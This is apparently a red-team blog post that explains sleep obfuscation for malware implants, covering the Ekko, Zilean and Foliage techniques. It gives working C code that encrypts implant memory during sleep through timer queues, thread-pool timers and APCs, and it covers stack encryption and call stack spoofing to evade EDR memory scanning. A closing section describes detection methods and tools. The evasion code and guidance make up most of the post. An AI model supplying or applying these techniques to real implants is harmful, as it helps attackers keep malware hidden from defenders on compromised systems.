---
title: "Sleep Obfuscation Deep Dive: Ekko, Zilean, and Foliage"
description: "Advanced sleep obfuscation techniques that encrypt implant memory during sleep cycles to evade EDR memory scanning - covering Ekko, Zilean, Foliage, and custom implementations."
date: 2026-03-29
difficulty: Hard
tags: [sleep-obfuscation, ekko, zilean, foliage, edr-evasion, opsec]
image: "https://robinx0.github.io/assets/img/sleep-obf.png"
---

## The Problem: Your Implant Is Naked in Memory
 
A running implant has a fundamental exposure window. Between callbacks, it sits idle in process memory — its configuration, strings, and shellcode in plaintext. Modern EDR products exploit this window with **periodic memory scanning**: every 30–120 seconds, they walk process virtual address space looking for byte patterns via YARA rules, signature hashes, or ML classifiers. A Cobalt Strike beacon with its default config block and string table sitting in a `PAGE_EXECUTE_READ` region is trivially flagged, even if it's doing absolutely nothing at the time.
 
Sleep obfuscation closes this window. Before sleeping, the implant encrypts its own memory region. The EDR's periodic scan sees only ciphertext noise. When the sleep timer expires, the implant decrypts itself, performs its callback, re-encrypts, and returns to sleep. The implant is only cleartext for the brief execution window — milliseconds versus minutes.
 
The fundamental challenge is a chicken-and-egg problem: the code responsible for encrypting the implant's memory *is part of that memory*. It cannot encrypt itself and then continue executing. Every sleep obfuscation technique is ultimately a different solution to this sequencing problem — delegating the encrypt/decrypt operations to a mechanism that executes outside the implant's own instruction stream.
 
## How EDR Memory Scanning Works
 
Understanding what you're evading matters for choosing the right technique.
 
**Periodic sweeps** are the primary target. The EDR agent spawns a scanning thread (or uses a kernel callback) that iterates through committed memory regions of target processes. It reads pages, matches against signatures, and flags detections. These sweeps typically run on a 30–120 second interval. If your implant sleeps for 60 seconds and the sweep runs every 90 seconds, you need to be encrypted for roughly 59.95 of those 60 seconds — sleep obfuscation gives you that ratio.
 
**Event-triggered scans** fire on suspicious behavior: opening a handle to `lsass.exe`, calling `NtMapViewOfSection` into a remote process, loading a known-abused DLL. Sleep obfuscation doesn't directly address these because they fire during your *execution* window, not your sleep window. However, the shorter your cleartext window, the smaller the overlap chance with an event-triggered scan.
 
**Unbacked memory detection** is increasingly common. EDR products flag executable memory regions that aren't backed by a file on disk (i.e., not a loaded DLL or EXE). Sleep obfuscation alone doesn't solve this — you need module stomping or other backing techniques. But sleep obfuscation *does* prevent the content of that unbacked region from being readable during scans.
 
## Technique 1: Ekko
 
Ekko, published by @C5pider, was the first widely adopted sleep obfuscation technique. It uses the Windows **timer queue** API to schedule encryption and decryption as timer callbacks that execute outside the implant's thread.
 
### How Timer Queues Work
 
`CreateTimerQueue` creates a queue object. `CreateTimerQueueTimer` schedules a callback function to execute after a specified delay. The callback runs on a thread pool worker thread managed by the OS — critically, *not* on the implant's thread. This is what breaks the chicken-and-egg cycle: the implant's thread is blocked on a wait, while a separate worker thread performs the encryption.
 
### Implementation Walkthrough
 
The core flow requires three coordinated timers and a synchronization event:
 
```c
// resolve function pointers to avoid static imports
typedef NTSTATUS (NTAPI* fnSystemFunction032)(PUSTRING data, PUSTRING key);
fnSystemFunction032 pSystemFunction032 = (fnSystemFunction032)GetProcAddress(
    GetModuleHandleA("advapi32.dll"), "SystemFunction032"
);
 
// generate a per-cycle random key
BYTE keyBuf[16];
BCryptGenRandom(NULL, keyBuf, sizeof(keyBuf), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
 
// set up USTRING structs for SystemFunction032
USTRING key  = { 16, 16, keyBuf };
USTRING data = { regionSize, regionSize, implantBase };
 
// create synchronization event and timer queue
HANDLE hEvent = CreateEventW(NULL, FALSE, FALSE, NULL);
HANDLE hQueue = CreateTimerQueue();
HANDLE hTimer1 = NULL, hTimer2 = NULL, hTimer3 = NULL;
 
// Timer 1 — fires immediately (dueTime = 0): encrypt implant memory
CreateTimerQueueTimer(&hTimer1, hQueue,
    (WAITORTIMERCALLBACK)pSystemFunction032,
    &encryptArgs,       // struct containing {data, key}
    0,                  // due time: fire immediately
    0,                  // period: one-shot
    WT_EXECUTEINTIMERTHREAD);
 
// Timer 2 — fires after sleep duration: decrypt implant memory
CreateTimerQueueTimer(&hTimer2, hQueue,
    (WAITORTIMERCALLBACK)pSystemFunction032,
    &decryptArgs,       // same key = same operation (RC4 is symmetric)
    sleepTimeMs,        // due time: fire after sleep
    0,
    WT_EXECUTEINTIMERTHREAD);
 
// Timer 3 — fires slightly after Timer 2: signal main thread to wake
CreateTimerQueueTimer(&hTimer3, hQueue,
    (WAITORTIMERCALLBACK)SetEvent,
    hEvent,
    sleepTimeMs + 100,  // small delta after decryption completes
    0,
    WT_EXECUTEINTIMERTHREAD);
 
// main thread blocks here — implant is encrypted during this wait
WaitForSingleObject(hEvent, INFINITE);
 
// cleanup
DeleteTimerQueue(hQueue);
CloseHandle(hEvent);
// implant is decrypted, continue execution
```
 
### Execution Timeline
 
```
t=0ms       Main thread creates timers, enters WaitForSingleObject
t≈0ms       Timer 1 fires on worker thread → RC4 encrypt implant memory
            (implant memory is now ciphertext)
t=0..N ms   Main thread blocked, EDR scans see only encrypted noise
t=N ms      Timer 2 fires on worker thread → RC4 decrypt implant memory
t=N+100ms   Timer 3 fires → SetEvent unblocks main thread
t=N+100ms   Main thread resumes execution in cleartext
```
 
The critical insight: the main thread is suspended on `WaitForSingleObject` the entire time. The encrypt/decrypt operations happen on the timer queue's worker thread, which is executing `ntdll!RtlpTpTimerCallback` → `advapi32!SystemFunction032` — a completely legitimate call stack from the OS's perspective.
 
### Limitations
 
Ekko creates visible kernel objects: a timer queue and three timer objects. EDR products can enumerate these via `NtQueryObject` or by walking the timer queue structures. The worker thread's call stack, while functional, has a recognizable pattern — `ntdll!TppTimerQueueExpiration` calling into a crypto function is unusual. Ekko also does **not** cycle memory protections, so the implant's memory region remains `PAGE_EXECUTE_READ` during encryption — some EDRs specifically flag RX regions containing high-entropy content.
 
## Technique 2: Zilean
 
Zilean improves on Ekko in two significant ways: it uses the **thread pool timer** API instead of the legacy timer queue, and it cycles memory protections around the encryption operation.
 
### Thread Pool Timers vs. Timer Queues
 
`CreateThreadpoolTimer` is the modern replacement for `CreateTimerQueueTimer`. The practical differences for sleep obfuscation:
 
The callback executes on a standard thread pool worker, producing a call stack that is indistinguishable from any application using the Windows thread pool (which is nearly every modern Windows application). No dedicated timer queue kernel object is created — the timer is managed within the process's default thread pool, which already exists. The API surface is cleaner: `CreateThreadpoolTimer`, `SetThreadpoolTimer`, `WaitForThreadpoolTimerCallbacks`, `CloseThreadpoolTimer`.
 
### Memory Protection Cycling
 
This is Zilean's most important contribution. Instead of leaving the implant region as RX while it contains encrypted content, Zilean changes protections:
 
```c
// callback context structure passed to each timer callback
typedef struct _OBFUSCATE_CONTEXT {
    PVOID   implantBase;
    SIZE_T  regionSize;
    USTRING data;
    USTRING key;
    HANDLE  hEvent;
    DWORD   oldProtect;
} OBFUSCATE_CONTEXT, *POBFUSCATE_CONTEXT;
 
// Callback 1: change to RW, then encrypt
VOID CALLBACK EncryptCallback(PTP_CALLBACK_INSTANCE inst, PVOID ctx, PTP_TIMER timer) {
    POBFUSCATE_CONTEXT pCtx = (POBFUSCATE_CONTEXT)ctx;
 
    // remove execute permission before encrypting
    VirtualProtect(pCtx->implantBase, pCtx->regionSize,
                   PAGE_READWRITE, &pCtx->oldProtect);
 
    // RC4 encrypt in place
    SystemFunction032(&pCtx->data, &pCtx->key);
}
 
// Callback 2: decrypt, then restore RX
VOID CALLBACK DecryptCallback(PTP_CALLBACK_INSTANCE inst, PVOID ctx, PTP_TIMER timer) {
    POBFUSCATE_CONTEXT pCtx = (POBFUSCATE_CONTEXT)ctx;
 
    // RC4 decrypt (symmetric — same key, same function)
    SystemFunction032(&pCtx->data, &pCtx->key);
 
    // restore execute permission
    VirtualProtect(pCtx->implantBase, pCtx->regionSize,
                   PAGE_EXECUTE_READ, &pCtx->oldProtect);
 
    // signal main thread
    SetEvent(pCtx->hEvent);
}
```
 
The orchestration code:
 
```c
// create thread pool timers
PTP_TIMER tpEncrypt = CreateThreadpoolTimer(EncryptCallback, &ctx, NULL);
PTP_TIMER tpDecrypt = CreateThreadpoolTimer(DecryptCallback, &ctx, NULL);
 
// set due times
// encrypt fires immediately
FILETIME ftImmediate = { 0 };
SetThreadpoolTimer(tpEncrypt, &ftImmediate, 0, 0);
 
// decrypt fires after sleep duration
ULARGE_INTEGER ulDue;
ulDue.QuadPart = -(LONGLONG)(sleepTimeMs * 10000);  // relative time, 100ns units
FILETIME ftSleep;
ftSleep.dwLowDateTime  = ulDue.LowPart;
ftSleep.dwHighDateTime = ulDue.HighPart;
SetThreadpoolTimer(tpDecrypt, &ftSleep, 0, 0);
 
// block until decryption completes and event is signaled
WaitForSingleObject(ctx.hEvent, INFINITE);
 
// cleanup
CloseThreadpoolTimer(tpEncrypt);
CloseThreadpoolTimer(tpDecrypt);
```
 
### Why Protection Cycling Matters
 
During the encrypted sleep window, the implant's memory is `PAGE_READWRITE` — not executable. This looks far less suspicious than an RX region full of high-entropy data. When EDR products scan memory, they prioritize executable regions. A RW region with random-looking content could be anything: a decompression buffer, an image being processed, encrypted application data. An RX region with the same content is almost certainly obfuscated code.
 
The transition pattern (RX → RW → RX) is itself a potential detection signal, but the individual states are much cleaner than Ekko's permanent RX-with-ciphertext.
 
## Technique 3: Foliage
 
Foliage, by @0xBoku, takes a fundamentally different approach. Instead of delegating encryption to a separate thread via timers, it uses **Asynchronous Procedure Calls (APCs)** queued to the implant's own thread. The encrypt/decrypt operations execute on the same thread, in the same context, with no cross-thread operations and no timer kernel objects.
 
### How APCs Enable Same-Thread Obfuscation
 
When a thread enters an **alertable wait** state (via `SleepEx`, `WaitForSingleObjectEx`, `SignalObjectAndWait` with `bAlertable = TRUE`), the kernel checks the thread's APC queue. If APCs are pending, they execute *before* the thread enters the wait. This is the key: you queue the encryption operations as APCs, then enter an alertable sleep. The APCs fire first (encrypting memory), then the thread sleeps for the specified duration with memory encrypted.
 
On wake, you queue decryption APCs and flush them with a zero-duration alertable wait.
 
### Implementation
 
```c
// --- Phase 1: Encrypt and Sleep ---
 
// queue memory protection change: RX → RW
NtQueueApcThread(
    hThread,                              // current thread
    (PPS_APC_ROUTINE)pVirtualProtect,     // resolved VirtualProtect pointer
    implantBase,                          // base address
    (PVOID)regionSize,                    // region size
    (PVOID)PAGE_READWRITE                 // new protection
);
 
// queue encryption
NtQueueApcThread(
    hThread,
    (PPS_APC_ROUTINE)pSystemFunction032,
    &data,                                // USTRING pointing to implant memory
    &key,                                 // USTRING containing RC4 key
    NULL
);
 
// enter alertable sleep — APCs fire first, then thread sleeps
// execution order: VirtualProtect(RW) → Encrypt → Sleep(duration)
SleepEx(sleepTimeMs, TRUE);
 
// --- Phase 2: Wake and Decrypt ---
 
// thread has woken — memory is still encrypted and RW
// queue decryption
NtQueueApcThread(
    hThread,
    (PPS_APC_ROUTINE)pSystemFunction032,
    &data,
    &key,
    NULL
);
 
// queue protection restore: RW → RX
NtQueueApcThread(
    hThread,
    (PPS_APC_ROUTINE)pVirtualProtect,
    implantBase,
    (PVOID)regionSize,
    (PVOID)PAGE_EXECUTE_READ
);
 
// flush decryption APCs — zero-duration alertable wait
SleepEx(0, TRUE);
 
// memory is now decrypted and RX — continue execution
```
 
### Execution Timeline
 
```
t=0         Queue APC: VirtualProtect(RW)
            Queue APC: SystemFunction032(encrypt)
            Call SleepEx(N, TRUE)
              → APC fires: memory set to RW
              → APC fires: memory encrypted
              → Thread enters sleep (memory is encrypted + RW)
t=0..N      Thread sleeping, memory encrypted
t=N         Thread wakes from SleepEx
            Queue APC: SystemFunction032(decrypt)
            Queue APC: VirtualProtect(RX)
            Call SleepEx(0, TRUE)
              → APC fires: memory decrypted
              → APC fires: memory set to RX
              → Returns immediately (duration = 0)
t=N+ε       Execution continues, memory cleartext + RX
```
 
### Why Foliage Is Cleaner
 
No kernel objects are created — no timer queues, no thread pool timers. The call stack during encryption/decryption shows the thread's own `SleepEx` → `ntdll!NtDelayExecution` with APC dispatch frames, which is a completely normal pattern for any thread using alertable waits. There are no cross-thread operations: the encryption happens in the implant thread's own context, eliminating races and simplifying the implementation. The APC queue is an in-memory list attached to the thread's `KTHREAD` structure, not a separately enumerable object.
 
### Caveat: APC Ordering
 
APCs queued via `NtQueueApcThread` execute in FIFO order, which is what makes the sequencing work. However, if *any other code* in the process also queues an APC to your thread between your queue calls and your alertable wait entry, it will interleave with your operations. In practice this is rare but worth noting — a hooked `SleepEx` that queues its own APC could break the sequence.
 
## Comparison
 
| Feature | Ekko | Zilean | Foliage |
|---|---|---|---|
| Scheduling mechanism | Timer queue (`CreateTimerQueueTimer`) | Thread pool timer (`CreateThreadpoolTimer`) | APCs (`NtQueueApcThread`) |
| Execution context | Dedicated timer worker thread | Thread pool worker thread | Same implant thread |
| Memory protection cycling | No — stays RX during encryption | Yes — RX → RW → RX | Yes — RX → RW → RX |
| Kernel objects created | Timer queue + 3 timer objects | Thread pool timer objects (in existing pool) | None |
| Call stack during sleep | Worker thread with timer dispatch frames | Standard thread pool callback frames | Normal alertable wait frames |
| Cross-thread operations | Yes — worker thread touches implant memory | Yes — pool worker touches implant memory | No — same thread throughout |
| Implementation complexity | Low | Medium | Medium |
| Primary weakness | Enumerable timer objects, no prot cycling | RX→RW→RX transition pattern | Relies on APC FIFO ordering |
 
## Practical Considerations
 
### Choosing Your Encryption Primitive
 
`SystemFunction032` performs RC4 encryption and is exported by `advapi32.dll` (internally forwarded from `ntdll`). It was the original choice because it's a single function call, operates in-place, and is symmetric — the same call with the same key decrypts. However, `SystemFunction032` is now a well-known IOC. EDR products specifically monitor for cross-references to this function from suspicious contexts.
 
Alternatives to consider: `BCryptEncrypt` with AES-CBC or AES-CTR looks like legitimate application cryptography, since hundreds of normal applications call the BCrypt API. A custom XOR loop with a per-cycle random key is simple and avoids any crypto API calls entirely, though the XOR implementation itself must live outside the encrypted region. You can also resolve `SystemFunction032` by hash rather than name and call it via pointer, which avoids the import table entry but doesn't prevent runtime API monitoring.
 
Whichever primitive you use, generate a **fresh key per sleep cycle**. A static key means an analyst who captures one encrypted snapshot and one cleartext snapshot can derive the key and decrypt all future captures.
 
### Protecting the Key Material
 
The encryption key itself must survive the sleep cycle without being scannable. Options include storing it in a small separate allocation — a 16-byte heap allocation is too small for any signature engine to flag. You can also derive it deterministically from values available after waking: `hash(ThreadId || TickCount || PerformanceCounter)` sampled before encryption, with the same inputs resampled after waking (noting that you need inputs stable across the sleep, or you store just the hash). Another approach is storing it in a register context via `SetThreadContext` on a suspended helper thread, though this adds complexity.
 
### Don't Forget the Stack
 
This is where many implementations fall short. The implant's stack contains decrypted strings from recent function calls, return addresses pointing into the implant's code region, function arguments and local variables, and structured exception handler (SEH) chain entries pointing to implant code.
 
If you encrypt only the implant's PE/shellcode region but leave the stack untouched, an EDR scanning the stack will find pointers into your (now-encrypted) code region — which is itself suspicious — and potentially cleartext strings or data that were passed as function arguments.
 
The solution is to include relevant stack pages in your encryption range. But this requires care: you cannot encrypt the stack frames that are *actively executing the encryption*. For Ekko and Zilean, this is naturally handled because the encryption runs on a different thread — the implant thread's stack is idle and safe to encrypt. For Foliage, the APC executes on the implant's own thread, so the APC callback's own stack frame must be excluded from the encryption range.
 
In practice, capture the stack pointer before setting up encryption:
 
```c
// capture current stack boundary (approximate)
PVOID stackBase;
PVOID stackLimit;
NT_TIB* tib = (NT_TIB*)NtCurrentTeb();
stackBase  = tib->StackBase;
stackLimit = tib->StackLimit;
 
// include stack pages in encryption, but leave headroom
// for the encryption callback's own frame
SIZE_T stackSize = (SIZE_T)stackBase - (SIZE_T)stackLimit;
SIZE_T safeStackSize = stackSize - 0x1000;  // exclude top page (active frames)
```
 
### Complementary Technique: Call Stack Spoofing
 
Sleep obfuscation encrypts memory content, but the return addresses on your thread's call stack still tell a story. A sleeping thread whose stack frames point into unbacked memory (memory not mapped to any DLL or EXE on disk) is a strong signal for tools like `Hunt-Sleeping-Beacons`.
 
**Call stack spoofing** creates synthetic stack frames that point to legitimate module code. Before entering sleep, you overwrite your stack's return addresses with pointers into `kernel32.dll`, `ntdll.dll`, or other loaded modules — making it look like the thread is sleeping inside a normal API call chain. On wake, you restore the real return addresses.
 
This pairs directly with sleep obfuscation: the encrypted memory defeats content scanning, while the spoofed call stack defeats stack-walking analysis. Neither technique alone is sufficient against a modern EDR — together they address both detection vectors.
 
Common spoofing approaches include crafting frames that mimic `kernel32!BaseThreadInitThunk` → `ntdll!RtlUserThreadStart`, which is the standard call stack for any Windows thread. Some implementations use `RtlCaptureContext` to snapshot a clean stack from a legitimate thread and replay the frame structure.
 
## Detection
 
Understanding detection is important for both red and blue team audiences.
 
### Stack Walking + Unbacked Memory Correlation
 
This is how **Hunt-Sleeping-Beacons** and similar tools work. The detector enumerates all threads in a process, walks each thread's call stack using `StackWalk64` or `RtlVirtualUnwind`, and checks whether any return address points to a memory region that is not backed by a module on disk. A sleeping thread with a return address in an unbacked RX (or RW) region is a high-confidence indicator. Sleep obfuscation alone does not defeat this — you need call stack spoofing or module stomping.
 
### Memory Protection Transition Monitoring
 
**ETW (Event Tracing for Windows)** can capture `VirtualProtect` calls. A pattern of RX → RW → (sleep) → RW → RX on the same memory region, repeated at regular intervals, is a strong behavioral signature. Defenders can write KQL or Sigma rules matching this pattern:
 
```
// pseudocode detection logic
VirtualProtect events WHERE
  old_protection == PAGE_EXECUTE_READ AND
  new_protection == PAGE_READWRITE AND
  FOLLOWED BY (within N seconds)
    old_protection == PAGE_READWRITE AND
    new_protection == PAGE_EXECUTE_READ AND
  same base_address AND
  same process
```
 
### Entropy Analysis
 
During the encrypted sleep window, the implant's memory region contains ciphertext — which has near-maximum entropy (~8.0 bits per byte). A RW region with uniformly high entropy is unusual for legitimate application data. Some EDR products flag this, though the false positive rate is high enough that it's typically a secondary signal rather than a primary detection.
 
### Timer and APC Enumeration
 
For Ekko, the timer queue and timer objects are kernel structures that can be enumerated. For Foliage, the APC queue attached to a thread's `KTHREAD` structure can be inspected from kernel mode. Purpose-built detection tools inspect these structures looking for callbacks that point to crypto functions or to memory regions flagged by other heuristics.
 
### BeaconEye and Similar Tools
 
**BeaconEye** specifically targets Cobalt Strike's configuration block by scanning for the XOR-encoded config signature. Sleep obfuscation defeats BeaconEye's scan during the sleep window, but BeaconEye can still catch the implant during its brief cleartext execution window if it scans at the right moment. The mitigation is minimizing the cleartext window duration and randomizing sleep intervals to avoid predictable scan timing.
 
## Closing Thoughts
 
Sleep obfuscation is a baseline expectation for implant development on mature engagements. Start with Ekko to understand the scheduling mechanics and the encrypt-while-blocked pattern. Move to Zilean when you need cleaner thread pool call stacks and memory protection cycling. Graduate to Foliage for same-thread execution with no kernel object footprint. In production, pair sleep obfuscation with call stack spoofing and module-backed memory to address the full detection surface.
